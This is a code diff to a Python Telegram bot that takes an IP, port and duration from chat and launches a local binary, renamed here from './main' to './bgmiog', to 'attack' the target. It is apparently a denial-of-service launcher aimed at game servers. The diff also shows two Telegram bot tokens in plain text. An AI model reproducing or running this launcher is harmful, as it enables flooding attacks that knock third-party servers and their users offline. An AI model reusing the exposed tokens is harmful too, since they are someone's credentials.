@@ -76,7 +76,7 @@ def start_attack(update: Update, context: CallbackContext, ip, port, duration) -
 
     try:
         # Start the attack using subprocess (change the path to your executable)
-        attack_process = subprocess.Popen(['./main', ip, port, str(duration_seconds)])
+        attack_process = subprocess.Popen(['./bgmiog', ip, port, str(duration_seconds)])
         update.message.reply_text(f"Attack started on {ip}:{port} for {duration} minutes.")
     except Exception as e:
         update.message.reply_text(f"Failed to start the attack: {str(e)}")
@@ -95,7 +95,7 @@ def stop_attack(update: Update, context: CallbackContext) -> None:
 # Main function to set up the bot
 def main() -> None:
     # Your bot token here
-    TOKEN = '6774562140:AAG8gOFdvj98m9450X6i0bYINvq2yP8PIOs'
+    TOKEN = '7111518663:AAF7Psyncn6byP-QcxZfT0QRPhqyQv2K9aI'
     updater = Updater(TOKEN)
 
     dispatcher = updater.dispatcher
